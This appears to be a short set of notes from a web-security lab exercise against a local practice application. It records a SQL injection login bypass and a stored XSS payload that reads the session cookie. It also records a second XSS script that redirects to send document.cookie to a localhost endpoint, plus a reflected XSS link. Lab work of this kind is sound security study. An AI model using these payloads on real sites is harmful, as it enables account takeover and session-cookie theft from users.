# SQL injection

Task 1: SQL injection
- username: `alice@alice.com' --`
- Leave password empty
    - In SQL, `--` is comment

Task 2: persistent XSS
- XSS:
    - type into comments box: 
    - ```<script type='text/javascript'> alert(document.cookie); </script>``` 
    
```
<script type='text/javascript'> 
    if (window.location.href.includes('news')){
        console.log('done');
    }else{
        window.location = 'http://localhost:5005/news?text=' + document.cookie;
    }
</script>
```

Task 3: reflected XSS:
link: `http://localhost:5005/malicious`
